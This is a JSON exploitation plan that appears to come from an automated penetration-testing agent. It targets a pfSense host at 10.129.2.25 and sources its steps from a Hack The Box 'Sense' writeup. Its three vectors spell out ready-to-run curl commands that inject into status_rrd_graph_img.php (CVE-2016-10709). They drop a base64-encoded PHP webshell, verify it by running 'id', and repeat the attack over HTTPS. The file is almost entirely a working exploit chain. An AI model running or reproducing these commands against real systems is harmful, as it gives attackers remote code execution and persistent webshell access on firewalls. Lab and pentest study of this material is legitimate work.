{
  "plan_id": "plan_20241218_001",
  "target_ip": "10.129.2.25",
  "context_hash": "pfsense_lighttpd_1435_bsd_weak_highvalue",
  "attack_vectors": [
    {
      "vector_id": "vec_01",
      "priority": 1,
      "action": {
        "tool_name": "web_request",
        "command_template": "curl -s 'http://{target}/status_rrd_graph_img.php?database=queues;echo+\"PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2B\"|base64+-d>shell.php' -H 'User-Agent: Mozilla/5.0'",
        "parameters": {
          "target": "10.129.2.25",
          "port": 80,
          "path": "/status_rrd_graph_img.php",
          "payload": "queues;echo+\"PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2B\"|base64+-d>shell.php"
        },
        "timeout_seconds": 30
      },
      "prediction_metrics": {
        "classification": {
          "attack_type": "RCE",
          "mitre_id": "T1190",
          "cve_id": "CVE-2016-10709"
        },
        "hypothesis": {
          "confidence_score": 0.85,
          "rationale_tags": [
            "pfsense_confirmed",
            "lighttpd_1.4.35",
            "cve_2016_10709",
            "command_injection"
          ],
          "expected_success": true
        },
        "success_criteria": {
          "match_type": "http_status",
          "match_pattern": "200",
          "negative_pattern": "(404|403|500|error)"
        }
      },
      "rag_context": {
        "payload_snippet": "/status_rrd_graph_img.php?database=queues;cd+..;cd+..;cd+..;cd+usr;cd+local;cd+www;echo+\"{{BASE64_ENCODED_PHP}}\">writeup.php",
        "insight": "Successful exploitation of pfSense RCE vulnerability via command injection in status_rrd_graph_img.php parameter, requiring manual payload encoding to bypass filtering",
        "exploitation_logic": "Manual exploitation with Base64-encoded PHP payload to bypass strict filtering mechanisms and achieve RCE",
        "vulnerability_context": "pfSense vulnerable endpoint at status_rrd_graph_img.php with command injection in 'database' parameter",
        "source": "htb_sense1_writeup"
      }
    },
    {
      "vector_id": "vec_02",
      "priority": 2,
      "action": {
        "tool_name": "web_request",
        "command_template": "curl -s 'http://{target}/shell.php?cmd=id' -H 'User-Agent: Mozilla/5.0'",
        "parameters": {
          "target": "10.129.2.25",
          "port": 80,
          "path": "/shell.php",
          "cmd": "id"
        },
        "timeout_seconds": 15
      },
      "prediction_metrics": {
        "classification": {
          "attack_type": "RCE_Verification",
          "mitre_id": "T1059",
          "cve_id": "CVE-2016-10709"
        },
        "hypothesis": {
          "confidence_score": 0.8,
          "rationale_tags": [
            "webshell_execution",
            "command_verification",
            "pfsense_rce"
          ],
          "expected_success": true
        },
        "success_criteria": {
          "match_type": "regex_match",
          "match_pattern": "(uid=|gid=|groups=)",
          "negative_pattern": "(404 Not Found|PHP Parse error)"
        }
      },
      "rag_context": {
        "payload_snippet": "Access created writeup.php file with cmd parameter to execute commands",
        "insight": "Verify RCE success by executing system commands through the uploaded PHP webshell",
        "exploitation_logic": "Use cmd parameter in uploaded PHP file to execute system commands and verify shell access",
        "vulnerability_context": "Command execution verification after successful PHP webshell upload",
        "source": "htb_sense1_writeup"
      }
    },
    {
      "vector_id": "vec_03",
      "priority": 3,
      "action": {
        "tool_name": "web_request",
        "command_template": "curl -s 'https://{target}/status_rrd_graph_img.php?database=queues;echo+\"PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2B\"|base64+-d>shell_ssl.php' -k -H 'User-Agent: Mozilla/5.0'",
        "parameters": {
          "target": "10.129.2.25",
          "port": 443,
          "path": "/status_rrd_graph_img.php",
          "payload": "queues;echo+\"PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2B\"|base64+-d>shell_ssl.php"
        },
        "timeout_seconds": 30
      },
      "prediction_metrics": {
        "classification": {
          "attack_type": "RCE",
          "mitre_id": "T1190",
          "cve_id": "CVE-2016-10709"
        },
        "hypothesis": {
          "confidence_score": 0.82,
          "rationale_tags": [
            "pfsense_confirmed",
            "https_variant",
            "cve_2016_10709",
            "ssl_bypass"
          ],
          "expected_success": true
        },
        "success_criteria": {
          "match_type": "http_status",
          "match_pattern": "200",
          "negative_pattern": "(404|403|500|SSL handshake failed)"
        }
      },
      "rag_context": {
        "payload_snippet": "/status_rrd_graph_img.php?database=queues;cd+..;cd+..;cd+..;cd+usr;cd+local;cd+www;echo+\"{{BASE64_ENCODED_PHP}}\">writeup.php",
        "insight": "Alternative HTTPS exploitation path for the same pfSense RCE vulnerability",
        "exploitation_logic": "Same Base64 payload technique applied to HTTPS service for redundant access",
        "vulnerability_context": "pfSense HTTPS management interface vulnerable to same command injection",
        "source": "htb_sense1_writeup"
      }
    }
  ],
  "created_at": "2024-12-18T10:30:00Z"
}